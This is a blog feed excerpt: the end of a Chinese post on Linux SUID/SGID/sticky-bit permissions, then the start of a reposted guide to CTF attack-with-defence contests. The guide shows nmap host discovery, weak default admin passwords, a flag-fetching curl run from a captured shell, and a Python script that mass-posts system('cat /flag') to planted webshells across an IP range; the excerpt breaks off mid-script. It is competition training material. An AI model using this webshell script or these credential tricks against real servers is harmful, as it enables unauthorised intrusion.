    <content type="html"><![CDATA[<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>SUID&#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x7684;&#x7279;&#x6B8A;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x4E3B;&#x7684;&#x6743;&#x9650;&#xFF08;&#x4EC5;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x6709;&#x6548;&#xFF09;&#x3002;&#x5C31;&#x60F3;&#x624B;&#x6301;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x7684;&#x94A6;&#x5DEE;&#x5927;&#x81E3;&#xFF0C;&#x4ED6;&#x624B;&#x6301;&#x7684;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x7687;&#x4E0A;&#x7684;&#x6743;&#x5A01;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x60E9;&#x6212;&#x8D2A;&#x5B98;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x8FD9;&#x4ED6;&#x6C38;&#x4E45;&#x6210;&#x4E3A;&#x4E86;&#x7687;&#x4E0A;&#x3002;<br>&#x67E5;&#x770B;passwd&#x547D;&#x4EE4;&#x5C5E;&#x6027;&#x662F;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x8005;&#x7684;&#x6743;&#x9650;&#x6709;<code>rwx</code>&#x53D8;&#x6210;&#x4E86;<code>rws</code>&#xFF0C;&#x5176;&#x4E2D;<strong>x</strong>&#x53D8;&#x6210;<strong>s</strong>&#x5C31;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x6587;&#x4EF6;&#x88AB;&#x8D4B;&#x4E88;&#x4E86;SUID&#x6743;&#x9650;&#x3002;<br>&#x90A3;&#x5982;&#x679C;&#x539F;&#x672C;&#x7684;&#x6743;&#x9650;&#x662F;<code>rw-</code>&#x5462;?&#x5982;&#x679C;&#x539F;&#x5148;&#x7684;&#x6743;&#x9650;&#x4F4D;&#x4E0A;&#x6CA1;&#x6709;<code>x</code>&#x6267;&#x884C;&#x6743;&#x9650;&#xFF0C;&#x90A3;&#x4E48;&#x80CC;&#x8D4B;&#x4E88;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x540E;&#x5C06;&#x53D8;&#x6210;&#x5927;&#x5199;&#x7684;S&#x3002;<br><a id="more"></a></p><h2 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h2><p>SGID&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x5982;&#x4E0B;&#x4E24;&#x79CD;&#x529F;&#x80FD;&#xFF1A;<br>&gt; &#x8BA9;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x7EC4;&#x7684;&#x6743;&#x9650;&#xFF08;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#xFF1B;<br>&gt; &#x5728;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x81EA;&#x52A8;&#x7EE7;&#x627F;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x7528;&#x6237;&#x7EC4;&#xFF08;&#x53EA;&#x53EF;&#x4EE5;&#x5BF9;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#x3002;</p><h2 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h2><p>&#x73B0;&#x5728;&#xFF0C;&#x5927;&#x5B66;&#x91CC;&#x7684;&#x5F88;&#x591A;&#x8001;&#x5E08;&#x90FD;&#x8981;&#x6C42;&#x5B66;&#x751F;&#x5C06;&#x4F5C;&#x4E1A;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7279;&#x5B9A;&#x5171;&#x4EAB;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4F46;&#x603B;&#x662F;&#x6709;&#x51E0;&#x4E2A;&#x201C;&#x7834;&#x574F;&#x5206;&#x5B50;&#x201D;&#x559C;&#x6B22;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x4F5C;&#x4E1A;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x8981;&#x8BBE;&#x7F6E;SBIT(Sticky Bit)&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E86;(&#x4E5F;&#x53EF;&#x4EE5;&#x79F0;&#x4E4B;&#x4E3A;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E4B;&#x7C98;&#x6EDE;&#x4F4D;)&#x3002;SBIT&#x7279;&#x6B8A;&#x6743;&#x9650;&#x53EF;&#x786E;&#x4FDD;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x6587;&#x4EF6;&#x3002;</p><h1 id="&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;"><a href="#&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;" class="headerlink" title="&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;"></a>&#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002;</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SUID&quot;&gt;&lt;a href=&quot;#SUID&quot; class=&quot;headerlink&quot; title=&quot;SUID&quot;&gt;&lt;/a&gt;SUID&lt;/h2&gt;&lt;p&gt;SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效）。就想手持尚方宝剑的钦差大臣，他手持的尚方宝剑代表的是皇上的权威，因此可以惩戒贪官，但并不意味这他永久成为了皇上。&lt;br&gt;查看passwd命令属性是发现所有者的权限有&lt;code&gt;rwx&lt;/code&gt;变成了&lt;code&gt;rws&lt;/code&gt;，其中&lt;strong&gt;x&lt;/strong&gt;变成&lt;strong&gt;s&lt;/strong&gt;就意味着该文件被赋予了SUID权限。&lt;br&gt;那如果原本的权限是&lt;code&gt;rw-&lt;/code&gt;呢?如果原先的权限位上没有&lt;code&gt;x&lt;/code&gt;执行权限，那么背赋予特殊权限后将变成大写的S。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下赛AWD套路小结</title>
    <link href="https://marnm.github.io//posts/28c30eb2/"/>
    <id>https://marnm.github.io//posts/28c30eb2/</id>
    <published>2018-08-13T09:03:28.000Z</published>
    <updated>2022-04-28T06:34:56.338Z</updated>
    
    <content type="html"><![CDATA[<p>CTF&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x653B;&#x9632;&#x8D5B;&#x5165;&#x95E8;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x9ED1;&#x5BA2;&#x653B;&#x9632;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BDD;&#x770B;&#x770B;&#x8FD9;&#x7BC7;&#x5165;&#x95E8;&#x3002;<br>&#x65B0;&#x624B;&#x8BE5;&#x77E5;&#x9053;&#x7684;&#x4E00;&#x4E9B;&#x77E5;&#x8BC6;&#x4EE5;&#x53CA;&#x6280;&#x5DE7;&#xFF0C;&#x4E0B;&#x9762;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;<br><a id="more"></a></p><blockquote><p>&#x539F;&#x521B;&#xFF1A;tinyfisher<br>&#x8F6C;&#x8F7D;&#xFF1A;<a href="https://xz.aliyun.com/" target="_blank" rel="noopener">&#x5148;&#x77E5;&#x5B89;&#x5168;&#x6280;&#x672F;&#x793E;&#x533A;</a></p></blockquote><p>&#x6700;&#x8FD1;&#x6253;&#x4E86;2&#x573A;CTF&#x7EBF;&#x4E0B;&#x8D5B;&#xFF0C;&#x628A;AWD&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x5957;&#x8DEF;&#x505A;&#x4E00;&#x4E9B;&#x603B;&#x7ED3;&#xFF0C;&#x672C;&#x4EBA;web&#x72D7;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x90E8;&#x5206;&#x5C31;&#x4E0D;&#x73ED;&#x95E8;&#x5F04;&#x65A7;&#x4E86;&#x3002;</p><h1 id="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"><a href="#&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;" class="headerlink" title="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"></a>&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;</h1><p>AWD: Attack With Defence, &#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7EF4;&#x62A4;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5F97;&#x5206;&#xFF0C;&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x653B;&#x51FB;&#x5931;&#x5206;&#x3002;<br><!--more--></p><ol><li>&#x4E00;&#x822C;&#x5206;&#x914D;Web&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x591A;&#x6570;&#x4E3A;Linux&#xFF09;&#x67D0;&#x5904;&#x5B58;&#x5728;flag&#xFF08;&#x4E00;&#x822C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF09;&#xFF1B;</li><li>&#x53EF;&#x80FD;&#x4F1A;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x6D41;&#x91CF;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF1B;</li><li>flag&#x5728;&#x4E3B;&#x529E;&#x65B9;&#x7684;&#x8BBE;&#x5B9A;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x5237;&#x65B0;&#x4E00;&#x8F6E;&#xFF1B;</li><li>&#x5404;&#x961F;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x521D;&#x59CB;&#x5206;&#x6570;&#xFF1B;</li><li>flag&#x4E00;&#x65E6;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x62FF;&#x8D70;&#xFF0C;&#x8BE5;&#x961F;&#x6263;&#x9664;&#x4E00;&#x5B9A;&#x79EF;&#x5206;&#xFF1B;</li><li>&#x6263;&#x9664;&#x7684;&#x79EF;&#x5206;&#x6709;&#x83B7;&#x53D6;flag&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li><li>&#x4E3B;&#x529E;&#x65B9;&#x4F1A;&#x5BF9;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x670D;&#x52A1;&#x8FDB;&#x884C;check&#xFF0C;&#x670D;&#x52A1;&#x5B95;&#x673A;&#x6263;&#x9664;&#x672C;&#x8F6E;flag&#x5206;&#x6570;&#xFF0C;&#x6263;&#x9664;&#x7684;&#x5206;&#x503C;&#x7531;&#x670D;&#x52A1;check&#x6B63;&#x5E38;&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li><li>&#x4E00;&#x822C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF0C;&#x975E;root&#x6743;&#x9650;</li></ol><h1 id="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"><a href="#&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;" class="headerlink" title="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"></a>&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;</h1><p>&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x56FE;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><hr><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg" alt="&#x62D3;&#x6251;&#x56FE;" title="">                </div>                <div class="image-caption">&#x62D3;&#x6251;&#x56FE;</div>            </figure><p>&#x6BD4;&#x8D5B;&#x4E2D;&#x83B7;&#x53D6;flag&#x4E00;&#x822C;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;<br>&#xFF08;1&#xFF09;flag&#x5728;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x8BFB;&#x53D6;flag&#x5185;&#x5BB9;&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x5F97;&#x5206;<br>&#xFF08;2&#xFF09;&#x62FF;&#x5230;&#x5176;&#x4ED6;&#x961F;&#x4F0D;shell&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#xFF08;curl 10.0.0.2&#xFF09;&#xFF0C;&#x5373;&#x53EF;&#x4ECE;&#x4E0A;&#x56FE;&#x4E2D;flag&#x673A;&#x83B7;&#x53D6;flag&#x5185;&#x5BB9;&#xFF1B;</p><p>&#x6BD4;&#x8D5B;&#x53EF;&#x80FD;&#x4F1A;&#x544A;&#x8BC9;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x540C;&#x4E00;&#x4E2A;C&#x6BB5;&#x6216;&#x8005;B&#x6BB5;&#xFF0C;&#x56E0;&#x6B64;&#x9996;&#x5148;&#x5229;&#x7528;nmap&#x7B49;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x53D1;&#x73B0;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF1A;<br><code>nmap -sn 192.168.71.0/24</code><br>&#x6216;&#x8005;&#x5229;&#x7528;<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> &#x7684;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x626B;&#x63CF;</p><h1 id="&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"><a href="#&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;" class="headerlink" title="&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"></a>&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;</h1><p>&#x7EBF;&#x4E0B;&#x8D5B;&#x4E00;&#x822C;3&#x4EBA;&#x5DE6;&#x53F3;&#xFF0C;2&#x4EBA;&#x653B;&#x51FB;&#xFF0C;1&#x4EBA;&#x9632;&#x5FA1;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x7684;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#xFF0C;&#x4E5F;&#x8981;&#x8FDB;&#x884C;&#x4FEE;&#x590D;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x9632;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#xFF0C;&#x4EE5;&#x653B;&#x4E3A;&#x5B88;&#x3002;</p><p>&#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x53EF;&#x80FD;&#x4F1A;&#x7EF4;&#x62A4;&#x591A;&#x4E2A;&#x9776;&#x673A;&#xFF0C;web&#x3001;&#x4E8C;&#x8FDB;&#x5236;&#x7B49;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6CA1;&#x4EBA;&#x8D1F;&#x8D23;&#x4E00;&#x53F0;&#xFF0C;&#x5404;&#x81EA;&#x8D1F;&#x8D23;&#x653B;&#x51FB;&#x548C;&#x9632;&#x5FA1;&#x3002;</p><h1 id="&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"><a href="#&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;" class="headerlink" title="&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"></a>&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;</h1><ol><li>&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;<br>&#x91CD;&#x8981;&#x7684;&#x4E8B;&#x60C5;&#x8BF4;&#x4E09;&#x904D;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#xFF08;/var/www/html)&#xFF0C;&#x8FD9;&#x662F;&#x6211;&#x81EA;&#x6211;&#x5BA1;&#x8BA1;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E5F;&#x662F;&#x9632;&#x6B62;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x6062;&#x590D;&#x5230;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#x3002;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;3&#x6B21;&#x5DE6;&#x53F3;&#x7684;&#x6062;&#x590D;&#x521D;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x4E0D;&#x63D0;&#x4F9B;&#xFF0C;&#x6240;&#x4EE5;&#x5907;&#x4EFD;&#x5341;&#x5206;&#x91CD;&#x8981;&#x3002;</li></ol><p>&#x53EF;&#x4EE5;&#x7528;scp&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E9B;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5DE5;&#x5177;&#xFF1A;<code>Winscp</code>&#x3001;<code>FileZilla</code>&#xFF0C;&#x64CD;&#x4F5C;&#x8D77;&#x6765;&#x6BD4;&#x4EF7;&#x65B9;&#x4FBF;&#x3002;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg" alt="winscp" title="">                </div>                <div class="image-caption">winscp</div>            </figure><p></p><ol start="2"><li>&#x53E3;&#x4EE4;&#x95EE;&#x9898;<br>&#x5F31;&#x53E3;&#x4EE4;&#x7684;&#x95EE;&#x9898;&#x51E0;&#x4E4E;&#x662F;&#x5FC5;&#x8003;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF08;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x4E2D;&#x90FD;&#x662F;phpCMS&#x3001;WordPress&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#x3002;</li></ol><p>Web&#x540E;&#x53F0;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;admin\admin,admin\123456,test\test&#x7B49;&#x7B49;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;&#x540E;&#x53F0;&#x53E3;&#x4EE4;&#xFF0C;&#x4E3A;&#x672C;&#x961F;&#x6240;&#x7528;&#xFF0C;&#x8BF4;&#x4E0D;&#x5B9A;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x53F0;getshell&#xFF0C;&#x6BD4;&#x5982;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;WordPress&#x3002;<br><!--more--></p><ol start="3"><li>&#x9884;&#x7559;&#x540E;&#x95E8;<br>&#x5728;&#x7EF4;&#x62A4;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x9884;&#x7559;&#x4E86;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x662F;&#x4E2A;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x8FC5;&#x901F;&#x6253;&#x4E00;&#x6CE2;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x89C6;&#x60C5;&#x51B5;&#x201C;&#x6405;&#x5C4E;&#x201D;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x4E00;&#x76F4;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x6BCF;&#x8F6E;&#x90FD;&#x5F97;&#x5206;&#xFF08;&#x540E;&#x9762;&#x7EC6;&#x8BF4;&#xFF09;<br>&#x5C06;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5229;&#x7528;<code>D&#x76FE;</code>&#x626B;&#x63CF;&#xFF0C;&#x4E00;&#x822C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF1A;<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg" alt="D-dun" title="">                </div>                <div class="image-caption">D-dun</div>            </figure>&#x53D1;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#xFF0C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x53D1;&#x8D77;&#x7B2C;&#x4E00;&#x6CE2;&#x653B;&#x51FB;&#xFF0C;&#x5982;&#x679C;&#x5229;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#xFF0C;&#x663E;&#x7136;&#x4E0D;&#x591F;&#x4F18;&#x96C5;&#xFF0C;&#x8FD8;&#x6CA1;&#x8FDE;&#x5B8C;&#xFF0C;&#x4EBA;&#x5BB6;&#x4F30;&#x8BA1;&#x90FD;&#x5220;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x867D;&#x7136;&#x662F;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x62FC;&#x7684;&#x662F;&#x624B;&#x901F;&#xFF0C;&#x56E0;&#x6B64;&#x5F97;&#x63D0;&#x524D;&#x51C6;&#x5907;&#x597D;&#x811A;&#x672C;&#xFF1A;<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.&quot;</span></span><br><span class="line">url1=<span class="string">&quot;&quot;</span></span><br><span class="line">shell=<span class="string">&quot;/Upload/index.php&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot;</span></span><br><span class="line">port=<span class="string">&quot;80&quot;</span></span><br><span class="line">payload = {passwd: <span class="string">&apos;system(\&apos;cat /flag\&apos;);&apos;</span>}</span><br><span class="line">f=open(<span class="string">&quot;webshelllist.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f1=oepn(<span class="string">&quot;firstroud_flag.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>[<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]:</span><br><span class="line">url1=url+str(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line"><span class="keyword">print</span> url1+<span class="string">&quot; connect shell sucess, flag is &quot;</span>+res.text</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">&quot; connect shell sucess, flag is &quot;</span>+res.text</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">&quot;,&quot;</span>+passwd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;shell not found!&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> url1+<span class="string">&quot; connect shell fail&quot;</span></span><br><span class="line">f.close()</span><br><span 